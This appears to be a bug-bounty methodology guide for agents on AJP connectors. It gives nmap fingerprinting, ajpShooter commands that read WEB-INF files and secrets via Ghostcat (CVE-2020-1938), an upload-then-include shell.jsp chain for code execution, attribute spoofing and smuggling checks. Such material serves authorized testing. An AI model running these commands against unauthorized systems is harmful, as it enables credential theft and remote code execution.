---
technology: "AJP (Apache JServ Protocol)"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
provenance: "upstream-grounded: Tomcat AJPv13 spec, CVE-2020-1938 advisories (RedHat/Debian/JPCERT), connector docs. Corpus: 1 writeup (bare 8009 listener); no usable usage patterns."
---

# AJP bug bounty methodology

Target model: a Tomcat (or other servlet container) AJP connector, usually
:8009, either directly exposed or fronted by httpd over AJP. Companion
overview: [[ajp|AJP]].

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Ghostcat file read/include (CVE-2020-1938) | Tomcat ≤9.0.30 / 8.5.50 / 7.0.99, AJP reachable | yes | Webapp file disclosure (`WEB-INF/`) — High; RCE where app stores uploads in webapp — Critical |
| Attribute-trust spoofing | app consumes `remote_user`/`ssl_*` AJP attributes | yes | Identity/TLS spoof, header injection — Medium+ |
| Proxy AJP smuggling (httpd ⇄ container) | httpd mod_proxy_ajk/mod_jk fronting | varies | Request smuggling, cache/proxy poisoning — High |
| Connector enumeration | any AJP listener | n/a | Version fingerprint — recon |

## Phase 0 — Detect and fingerprint the connector

```bash
nmap -p 8009,8010,8009s -sV 198.51.100.10

# NSE AJP suite does the binary handshake and reports the Server header
nmap --script ajp-methods,ajp-headers,ajp-request -p 8009 198.51.100.10
# ajp-headers output includes:
#   Server: Apache-Coyote/1.1        <- Tomcat family confirmed
#   X-Powered-By, Allow, and 404/200 shapes per requested path
```

Expected: closed port = REFUSED (nothing there); open-but-HTTP = you found
a plain HTTP service, not AJP; AJP answers only well-formed binary FORWARD
packets — which is what the NSE scripts send. Record the `Server` header
(`Apache-Coyote/1.1` spans many Tomcat versions — it is a family
fingerprint, not a version). Pull the exact version from an accompanying
HTTP surface (80/8080 error page, `/manager` realm) or from Ghostcat's own
read of release notes if reachable.

Debian-family note: their Tomcat ships AJP disabled by default (since 2008)
— an open 8009 there implies a hand-edited `server.xml` and correlates with
stale versions.

## Phase 1 — Ghostcat file read (CVE-2020-1938)

Affected: 9.0.0.M1–9.0.30, 8.5.0–8.5.50, 7.0.0–7.0.99 (fixed 9.0.31 /
8.5.51 / 7.0.100 — which also added requiredSecret and address hardening).
Mechanism: a raw AJP FORWARD request carrying
`javax.servlet.include.request_uri` / `.servlet_path` / `.path_info`
attributes makes the container dispatch to a file inside the webapp root as
an include — reading files the HTTP layer would never serve.

Tool: ajpShooter (public Python tool; `read` mode does exactly this).

```bash
# The canonical first read — the deployment descriptor itself
python3 ajpShooter.py http://198.51.100.10:8009 /WEB-INF/web.xml read
# Expected: AJP response 200 body = the XML deployment descriptor
```

Parse `web.xml` for the next moves (this is the "parse the results" step
that turns a file read into a report):

- `<servlet>` / `<servlet-mapping>` — hidden endpoints and servlet classes.
- `<init-param>` — configuration values: database URLs, credentials, API
  keys, debug flags. Record verbatim; these are the disclosure payload.
- `<resource-ref>` / context params — JNDI names, internal service hosts.
- `<login-config>` — realm mechanics for later credential attacks.

```bash
# Follow-up reads, in payoff order
python3 ajpShooter.py http://198.51.100.10:8009 /WEB-INF/classes/application.properties read
python3 ajpShooter.py http://198.51.100.10:8009 /WEB-INF/classes/<ServletClassName>.class read
# .class files: decompile offline (e.g. with a Java decompiler) for hardcoded secrets
```

Boundary: reads are confined to the webapp root (`../` traversal is not
part of the primitive). Fixed versions: connection dropped / attribute
ignored — no include dispatch, no body.

## Phase 2 — Ghostcat RCE escalation (conditional)

The include executes the target only when the file is processable AND
reaches a JSP-capable context. The reliable chain: find an app feature that
stores uploads **inside the webapp tree** (profile pictures, attachments),
upload a JSP/proc through it over HTTP, then include the uploaded file via
AJP attributes so it executes even though the app never intended to serve
it. This is two findings composed (upload + Ghostcat include) — report the
chain and each part.

```bash
# 1. Upload shell.jsp via the app's HTTP feature (its own upload endpoint)
# 2. Include it through AJP:
python3 ajpShooter.py http://198.51.100.10:8009 /uploads/shell.jsp read
# Command output arrives in the AJP response body when the include executes
```

## Phase 3 — Attribute-trust abuse (app-dependent)

Beyond the include family, a raw-AJP client can set attributes that
`mod_jk`/`mod_proxy_ajp` normally propagate from the trusted webserver:
`remote_user`, `ssl_cipher`, `jk_*`, and arbitrary header forwarding. If
the application (or its framework) reads these to decide authentication,
tenant, or client-cert presence, a single crafted FORWARD packet spoofs
them. Verify in a lab before claiming: send
`remote_user=admin@example.com` against an endpoint that reflects or
authorizes on the identity and observe behavior. Honest framing: this is a
misconfiguration/trust finding whose severity the app decides.

## Phase 4 — Proxy-pair smuggling checks

When httpd fronts the container over AJP and also serves other vhosts:

- Send ambiguous requests to the httpd listener (duplicate Content-Length,
  CL+TE) and diff responses via the AJP backend — desyncs surface as
  responses from the wrong vhost or smuggled-body execution.
- Test `h2c` upgrade against the front listener; an accepted upgrade can
  bypass front-end rules entirely (adjacent technique, not AJP-specific —
  see the vault's HTTP smuggling material when written).

These are full-authorization, careful-volume tests; one desync PoC is the
report.

## Reporting notes

Ghostcat evidence: the `web.xml` (or secret-bearing file) content in the
report, plus the exact ajpShooter invocation; severity anchors — file
disclosure High, composed upload+include chain Critical. Attribute-trust
findings must show the app consuming the spoofed value (request/response
transcript). Note the connector's exposure scope (internet-facing vs
internal) — it moves severity.

## Appendix A — Tool map

- **nmap** `--script ajp-methods,ajp-headers,ajp-request` — Phase 0
  handshake and Server fingerprint.
- **ajpShooter** (public Python) — Phases 1-2; `read` mode is the file-read
  primitive; also has an `eval`-style mode for shells — use only under full
  authorization.
- **A Java decompiler** (e.g. any CFR-class tool) — Phase 1 `.class` follow-ups.
- **curl / httpd-side tooling** — Phase 4 proxy-pair tests.
- Tools vault companions by name: nmap, curl, burpsuite (smuggling tests).

## Appendix B — Quick reference

```bash
nmap --script ajp-methods,ajp-headers,ajp-request -p 8009 198.51.100.10
python3 ajpShooter.py http://198.51.100.10:8009 /WEB-INF/web.xml read
python3 ajpShooter.py http://198.51.100.10:8009 /WEB-INF/classes/application.properties read
```

Version gates: Ghostcat ≤ 9.0.30 / 8.5.50 / 7.0.99 · fixed 9.0.31 / 8.5.51
/ 7.0.100 · Debian-family default = AJP disabled (open 8009 = deliberate
config). Cross-links: [[tomcat]] (parent platform), [[ajp|AJP overview]].
